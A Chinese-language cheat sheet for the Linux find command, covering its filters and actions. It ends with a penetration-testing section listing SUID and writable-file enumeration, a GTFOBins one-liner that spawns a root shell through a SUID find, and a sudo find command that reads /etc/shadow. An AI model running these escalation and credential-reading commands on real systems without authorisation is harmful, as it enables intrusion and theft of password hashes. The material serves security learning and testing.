# find 命令

在指定路径下按条件查找文件，并可对结果执行动作。GNU find，Linux 发行版自带。

## 基本语法

```
find [路径] [选项] [动作]
```

- 路径：查找起点，默认当前目录
- 按条件过滤文件，再对结果执行动作
- 没有指定条件时列出路径下所有条目

## 按名称查找

| 选项 | 说明 | 示例 |
|---|---|---|
| `-name "p"` | 按文件名匹配，支持通配符，区分大小写 | `find /etc -name "*.conf"` |
| `-iname "p"` | 忽略大小写 | `find / -iname "*ssh*"` |
| `-regex "p"` | 用正则匹配完整路径 | `find . -regex ".*\.sh"` |

## 按类型

| 选项 | 含义 |
|---|---|
| `-type f` | 普通文件 |
| `-type d` | 目录 |
| `-type l` | 符号链接 |
| `-type s` | socket |
| `-type p` | 命名管道 |

例：`find /var/log -type f` 列出 /var/log 下所有普通文件。

## 按大小

`-size [+/-]n[单位]`

单位：`b`（512 字节块，默认）、`c`（字节）、`w`（2 字节）、`k`、`M`、`G`。`+n` 大于，`-n` 小于，`n` 正好。

| 示例 | 含义 |
|---|---|
| `find / -size +100M` | 大于 100MB 的文件 |
| `find . -size -1k` | 小于 1KB |
| `find / -size 50c` | 正好 50 字节 |

## 按时间

| 选项 | 说明 |
|---|---|
| `-mtime +7` | 修改时间超过 7 天前 |
| `-mmin -60` | 60 分钟内修改过 |
| `-atime` / `-amin` | 按访问时间 |
| `-ctime` / `-cmin` | 按状态变化时间 |
| `-newer file` | 比指定文件新 |

## 按权限与所有者（安全重点）

| 选项 | 含义 |
|---|---|
| `-perm -4000` | 设了 SUID 位 |
| `-perm -2000` | 设了 SGID 位 |
| `-perm -1000` | 设了粘滞位（sticky） |
| `-user 用户名` | 所有者 |
| `-group 组名` | 所属组 |
| `-readable` / `-writable` / `-executable` | 当前用户可读 / 可写 / 可执行（GNU 扩展） |

`-perm` 前导符含义：
- `-perm -mode`：指定的权限位全部被设置
- `-perm /mode`：指定权限位任一被设置
- `-perm mode`：精确等于

例：
```
find / -perm -4000 -type f 2>/dev/null    # 找 SUID 文件（提权枚举）
find / -user root -perm -4000 -type f     # 找 root 所有的 SUID 文件
find / -writable -type f 2>/dev/null      # 找当前用户可写文件
```

## 逻辑操作符

| 操作符 | 含义 |
|---|---|
| `-a` / `-and` | 与（默认） |
| `-o` / `-or` | 或 |
| `!` | 取反 |

多个条件用括号分组时括号要转义：

```
find / \( -name "*.sh" -o -name "*.py" \) -type f
```

## 动作

| 动作 | 说明 |
|---|---|
| `-print` | 打印路径（默认） |
| `-ls` | 以 ls -l 风格输出 |
| `-delete` | 删除匹配项 |
| `-exec command {} \;` | 对每个结果执行命令，`{}` 为结果占位，`\;` 表示命令结束 |
| `-exec command {} +` | 把结果一次性作为参数批量执行 |

例：
```
find . -name "*.log" -exec rm {} \;
find /tmp -type f -mmin -30 -ls
find /var/log -name "*.log" -exec grep -l "error" {} +
```

`-exec` 里 shell 特殊字符要转义或加引号：`\;` 转义分号，`{}` 建议加引号。

## 安全 / 提权场景

### 1. 本机信息收集（渗透测试枚举）

```
find / -perm -4000 -type f 2>/dev/null        # 枚举 SUID 文件
find / -perm -2000 -type f 2>/dev/null        # 枚举 SGID 文件
find / -writable -type f 2>/dev/null          # 找可写文件（可劫持/改配置）
find / -name "*.bak" -o -name "*backup*" 2>/dev/null   # 找备份文件
find / -type f -name "*.conf" 2>/dev/null     # 找配置文件
find / -type f -size +10M 2>/dev/null         # 找大文件（dump、数据库）
find /home -name "*history*" 2>/dev/null      # 找 shell 历史
```

### 2. GTFOBins：find 本身带 SUID 时提权

当 `/usr/bin/find` 带 SUID 位时，可利用 `-exec` 以 root 身份弹 shell：

```
cd /tmp
/usr/bin/find . -exec /bin/sh -p \; -quit
```

原理：SUID 使进程 EUID 变为文件所有者（root）；`/bin/sh -p` 保留有效 UID，否则 bash/sh 检测到 euid != uid 会自动降权。

### 3. 配合 sudo 使用（sudo find）

若 `sudo -l` 显示可 sudo find，可借此读写任意文件：

```
sudo find . -exec cat /etc/shadow \;          # 读文件
sudo find . -exec chown root:root file \;      # 改属主
```

## 常见坑

- 无权限目录会输出错误，扫描全盘加 `2>/dev/null` 屏蔽。
- `find /` 全盘扫描慢，尽量限定路径和 `-type`。
- `-exec` 里 `{}`、`\;`、`!`、`(` `)` 在 shell 中需要转义或加引号。
- `-perm -4000` 会匹配所有权限位包含 SUID 的文件，比 `-perm 4000`（精确相等）更常用。
